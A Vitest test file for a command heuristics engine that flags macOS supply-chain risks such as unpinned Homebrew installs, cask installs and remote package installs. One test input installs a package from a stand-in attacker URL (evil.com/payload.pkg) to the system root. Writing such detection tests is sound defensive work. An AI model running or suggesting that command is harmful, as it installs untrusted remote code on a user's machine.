import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");

describe("macOS supply chain threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- brew install without version pin (CLT-MAC-SUPPLY-001) ---

	it("detects brew install without version (001)", () => {
		expect(matchCommand(engine, "brew install wget")).toContain("CLT-MAC-SUPPLY-001");
	});

	it("does NOT flag brew install with version pin (001 neg)", () => {
		const ids = matchCommand(engine, "brew install node@18");
		expect(ids.filter((id) => id === "CLT-MAC-SUPPLY-001")).toEqual([]);
	});

	// --- installer -pkg from remote URL (CLT-MAC-SUPPLY-002) ---

	it("detects installer -pkg from http URL (002)", () => {
		expect(matchCommand(engine, "installer -pkg https://evil.com/payload.pkg -target /")).toContain(
			"CLT-MAC-SUPPLY-002",
		);
	});

	// --- brew install --cask (CLT-MAC-SUPPLY-003) ---

	it("detects brew install --cask (003)", () => {
		expect(matchCommand(engine, "brew install --cask suspicious-app")).toContain(
			"CLT-MAC-SUPPLY-003",
		);
	});

	it("detects brew reinstall --cask (003)", () => {
		expect(matchCommand(engine, "brew reinstall --cask suspicious-app")).toContain(
			"CLT-MAC-SUPPLY-003",
		);
	});

	// --- Negative cases ---

	it("does not match brew update (harmless)", () => {
		const ids = matchCommand(engine, "brew update");
		expect(ids.filter((id) => id.startsWith("CLT-MAC-SUPPLY"))).toEqual([]);
	});

	it("does not match brew list (harmless)", () => {
		const ids = matchCommand(engine, "brew list");
		expect(ids.filter((id) => id.startsWith("CLT-MAC-SUPPLY"))).toEqual([]);
	});

	it("does not match installer without URL (local pkg, covered by CMD-011)", () => {
		const ids = matchCommand(engine, "installer -pkg /tmp/local.pkg -target /");
		expect(ids.filter((id) => id === "CLT-MAC-SUPPLY-002")).toEqual([]);
	});
});
